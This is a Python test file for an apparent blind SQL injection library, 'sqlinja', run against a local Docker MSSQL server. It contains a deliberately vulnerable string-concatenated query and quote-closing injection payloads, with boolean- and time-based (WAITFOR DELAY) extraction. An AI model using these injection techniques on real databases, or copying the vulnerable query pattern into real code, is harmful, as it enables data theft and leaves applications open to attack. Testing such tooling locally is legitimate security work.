#!/usr/bin/env python3
"""Integration tests for MsSqlConfig against a real MSSQL server.

Requires pymssql (see requirements-dev.txt) and a reachable MSSQL instance,
e.g.:

    docker run -d --name sqlinja-mssql \\
        -e "ACCEPT_EULA=Y" -e "MSSQL_SA_PASSWORD=Sqlinja_Test123!" \\
        -p 1433:1433 mcr.microsoft.com/mssql/server:2022-latest

Connection is configurable via env vars (defaults match the command above):
    SQLINJA_MSSQL_HOST (default 127.0.0.1)
    SQLINJA_MSSQL_PORT (default 1433)
    SQLINJA_MSSQL_USER (default sa)
    SQLINJA_MSSQL_PASSWORD (default Sqlinja_Test123!)
    SQLINJA_MSSQL_DB (default sqlinja_test)

If the server is unreachable, every test in this module is skipped rather
than failed, so the rest of the suite stays runnable without Docker.

This is the dialect that motivated the whole rewrite: UNICODE('') returns
NULL in T-SQL (unlike MySQL's ORD('')=0), which used to break end-of-string
detection -- these tests exercise that exact path against the real engine.
"""

import os
import string
import time
import unittest
from typing import Any

try:
    import pymssql
    HAS_DRIVER = True
except ImportError:
    HAS_DRIVER = False

from sqlinja import SqlInja, Mode, MsSqlConfig

HOST = os.environ.get("SQLINJA_MSSQL_HOST", "127.0.0.1")
PORT = str(int(os.environ.get("SQLINJA_MSSQL_PORT", "1433")))  # pymssql wants a str
USER = os.environ.get("SQLINJA_MSSQL_USER", "sa")
PASSWORD = os.environ.get("SQLINJA_MSSQL_PASSWORD", "Sqlinja_Test123!")
DATABASE = os.environ.get("SQLINJA_MSSQL_DB", "sqlinja_test")


def _server_reachable() -> bool:
    if not HAS_DRIVER:
        return False
    try:
        con = pymssql.connect(
            server=HOST, port=PORT, user=USER, password=PASSWORD, timeout=3, login_timeout=3
        )
        con.close()
        return True
    except pymssql.Error:
        return False


SKIP_REASON = "pymssql missing or MSSQL server unreachable"
SHOULD_SKIP = not _server_reachable()


@unittest.skipIf(SHOULD_SKIP, SKIP_REASON)
class _MsSqlUsersTableTestCase(unittest.TestCase):
    """Shared DB/table lifecycle for MSSQL integration tests; each mode's
    exec_request differs, so it stays in the subclass."""

    # the driver is optional, so its types can't be named here
    admin_con: Any
    admin_cur: Any

    @classmethod
    def setUpClass(cls):
        cls.admin_con = pymssql.connect(
            server=HOST, port=PORT, user=USER, password=PASSWORD, autocommit=True
        )
        cls.admin_cur = cls.admin_con.cursor()
        cls.admin_cur.execute(
            f"IF DB_ID('{DATABASE}') IS NULL CREATE DATABASE {DATABASE}"
        )

    @classmethod
    def tearDownClass(cls):
        cls.admin_cur.execute(
            f"IF DB_ID('{DATABASE}') IS NOT NULL "
            f"ALTER DATABASE {DATABASE} SET SINGLE_USER WITH ROLLBACK IMMEDIATE"
        )
        cls.admin_cur.execute(f"DROP DATABASE IF EXISTS {DATABASE}")
        cls.admin_cur.close()
        cls.admin_con.close()

    def setUp(self):
        self.con = pymssql.connect(
            server=HOST, port=PORT, user=USER, password=PASSWORD,
            database=DATABASE, autocommit=True,
        )
        self.cur = self.con.cursor()
        self.cur.execute(
            "CREATE TABLE Users("
            "Id INT IDENTITY(1,1) PRIMARY KEY, "
            "UserName VARCHAR(255), "
            "LastLoginIP VARCHAR(255))"
        )
        self.cur.executemany(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES (%s, %s)",
            [("soham", "10.0.0.1"), ("admin", "10.0.0.2"), ("guest", "10.0.0.3")],
        )

    def tearDown(self):
        self.cur.execute("DROP TABLE Users")
        self.cur.close()
        self.con.close()


class SqlInjaMsSqlTestCase(_MsSqlUsersTableTestCase):
    """Same vulnerable-route simulation as test_sqlinja.py (raw string
    concatenation, quote-closing injection), but executed against a real
    MSSQL server so MsSqlConfig's SQL fragments are exercised by the actual
    engine."""

    def setUp(self):
        super().setUp()
        self.helper = SqlInja(MsSqlConfig(), self.exec_request, mode=Mode.BOOLEAN)
        self.candidates = string.ascii_letters + string.digits

    def run_vulnerable_route(self, user_input: str) -> bool:
        query = "SELECT * FROM Users WHERE LastLoginIP = '" + user_input + "'"
        self.cur.execute(query)
        row = self.cur.fetchone()
        return row is not None

    def exec_request(self, payload: str, sleep_duration: int) -> bool:
        injected = f"nonexistent' OR ({payload}) -- "
        return self.run_vulnerable_route(injected)

    def test_check_detects_existing_row(self):
        self.assertTrue(self.helper.check("SELECT 1"))

    def test_check_detects_missing_row(self):
        self.assertFalse(
            self.helper.check("SELECT UserName FROM Users WHERE Id = 999")
        )

    def test_extract_val_reads_count(self):
        self.assertEqual(
            self.helper.extract_val("SELECT COUNT(*) FROM Users", 0, 100), 3
        )

    def test_extract_until_end_char_reads_cell(self):
        # UNICODE('') is NULL in T-SQL, so end-of-string detection relies on
        # code_or_end, not on UNICODE's own behaviour
        chars = list(
            self.helper.extract_until_end_char(
                "SELECT UserName FROM Users WHERE Id = 1", self.candidates
            )
        )
        self.assertEqual("".join(chars), "soham")

    def test_extract_by_length_reads_cell(self):
        chars = list(
            self.helper.extract_by_length(
                "SELECT UserName FROM Users WHERE Id = 2", self.candidates
            )
        )
        self.assertEqual("".join(chars), "admin")

    def test_extract_by_length_handles_null_value(self):
        self.cur.execute(
            "INSERT INTO Users(UserName, LastLoginIP) VALUES (NULL, '10.0.0.4')"
        )
        chars = list(
            self.helper.extract_by_length(
                "SELECT UserName FROM Users WHERE Id = 4", self.candidates
            )
        )
        self.assertEqual(chars, [])

    def test_extract_column_iterates_all_rows(self):
        request_template = "SELECT UserName FROM Users ORDER BY Id {index}"
        users = [
            "".join(cell)
            for cell in self.helper.extract_column(
                request_template, self.candidates, start_index=0
            )
        ]
        self.assertEqual(users, ["soham", "admin", "guest"])


class SqlInjaMsSqlTimeModeTestCase(_MsSqlUsersTableTestCase):
    """Same vulnerable route, but exec_request never looks at the query
    result -- only at how long the request took, exactly like a real
    time-blind exploitation would need to. This is the only way to
    exercise MsSqlConfig.as_time (";IF (cond) WAITFOR DELAY ...", a
    multi-statement batch) end to end: SQLite has no timing primitive to
    test this path with."""

    SLEEP_DURATION = 1

    def setUp(self):
        super().setUp()
        self.helper = SqlInja(
            MsSqlConfig(), self.exec_request,
            mode=Mode.TIME, sleep_duration=self.SLEEP_DURATION,
        )

    def run_vulnerable_route(self, user_input: str) -> None:
        query = "SELECT * FROM Users WHERE LastLoginIP = '" + user_input + "'"
        self.cur.execute(query)
        self.cur.fetchall()

    def exec_request(self, payload: str, sleep_duration: int) -> bool:
        injected = f"nonexistent' {payload} -- "
        start = time.monotonic()
        self.run_vulnerable_route(injected)
        elapsed = time.monotonic() - start
        return elapsed >= sleep_duration

    def test_check_detects_existing_row(self):
        self.assertTrue(self.helper.check("SELECT 1"))

    def test_check_detects_missing_row(self):
        self.assertFalse(
            self.helper.check("SELECT UserName FROM Users WHERE Id = 999")
        )

    def test_extract_val_reads_count(self):
        self.assertEqual(
            self.helper.extract_val("SELECT COUNT(*) FROM Users", 0, 10), 3
        )


if __name__ == "__main__":
    unittest.main()
